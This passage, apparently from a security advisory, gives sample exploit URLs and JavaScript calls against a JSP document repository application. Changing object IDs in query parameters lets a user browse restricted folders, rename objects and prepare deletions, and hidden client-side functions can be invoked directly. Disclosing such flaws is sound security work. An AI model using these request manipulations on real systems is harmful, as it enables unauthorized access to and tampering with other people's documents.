- Sample Exploit Code
---------------------------------------------------------

http://www.targetsite.com/pe/repository/displaynavigator.jsp?rootFolder=101
	-Allows an attacker to browse a limited directory tree (in this case, the action directory. Changing to "rootFolder=105" allows for the document library to be browsed.
		
http://www.targetsite.com/pe/repository/include/renamepopup.jsp?selectedObject=101
	-Allows an attacker to rename the selected object ID (in this case,	the action directory).

http://www.targetsite.com/pe/repository/displaydeletenavigator.jsp?selectedObjectsCSV=101
	-Sets the object CSV for the delete navigator.

The following javascript commands might also be used to 
call functions otherwise unavailable to the user:

showDeleteView()
showWebFolderView()
showLibraryView()
showMyLibraryView()
singleSelectObject(objid)
processRadioSelection(radio, objid)
processCheckboxSelection(chkbox, objid)
singleSelectObject(objid)
addToSelectedObjects(objid)
removeFromSelectedObjects(objid)
